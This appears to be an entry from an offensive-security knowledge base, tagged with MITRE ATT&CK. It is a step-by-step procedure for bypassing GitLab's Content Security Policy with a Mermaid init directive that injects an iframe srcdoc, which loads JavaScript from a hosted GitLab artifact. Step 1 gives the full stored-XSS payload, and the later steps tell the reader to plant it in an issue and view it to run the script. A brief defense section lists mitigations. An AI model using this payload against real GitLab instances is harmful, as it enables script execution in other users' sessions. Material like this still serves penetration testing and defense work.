---
tags:
  - csp-bypass
  - xss
  - iframe
type: procedure
tools:
  - '[[tools/Mermaid]]'
tactics:
  - '[[Execution]]'
commands: []
platforms:
  - Web
techniques:
  - '[[JavaScript]]'
  - '[[Disable or Modify Tools]]'
skill_level: advanced
impact_level: high
detection_risk: medium
sub_techniques: []
id: 99533cf8-e64f-4f19-ac54-6f2e054024a4
created_at: '2025-12-13T23:52:24.581Z'
updated_at: '2025-12-13T23:52:24.581Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Disable or Modify Tools]]'
---
# Bypass-CSP-with-Iframe-Srcdoc-in-Mermaid-Payload

## Summary

This procedure crafts an advanced Mermaid payload using iframe srcdoc to load and execute JS from a CSP-allowed GitLab artifact, bypassing inline script restrictions.

## Description

GitLab CSP allows scripts from gitlab.com. By prepending `<title>` to force HTML parsing in the style injection, an iframe srcdoc embeds the external script, executing it without violating CSP.

## Requirements

1. Hosted JS artifact URL from prior procedure
2. GitLab issue creation access
3. Knowledge of HTML entities for encoding

## Defense

Defensive measures and detection strategies:

- Tighten CSP to block iframe srcdoc or data URLs
- Sanitize Mermaid config inputs server-side
- Detect iframe injections in rendered content

## Objectives

1. Inject HTML-breaking payload
2. Load external JS via iframe
3. Achieve full JS execution

## Instructions

### Step 1: Craft Advanced Payload

**Context**: Build directive to inject iframe.

Payload: `%%{init: { 'fontFamily': '<title><iframe xmlns="http://www.w3.org/1999/xhtml" srcdoc="&lt;script src=<ARTIFACT_URL>&gt;&lt;/script&gt;">'} }%%`

Replace `<ARTIFACT_URL>` with actual URL.

### Step 2: Insert into New Issue

**Context**: Store the bypass payload.

Create new issue; add in Mermaid block with sequenceDiagram.

### Step 3: View and Execute

**Context**: Trigger load and run JS.

Save and view; iframe executes alert.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]
- [[Disable or Modify Tools]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/Mermaid]]

## Tags

- [[csp-bypass]]
- [[xss]]
- [[iframe]]
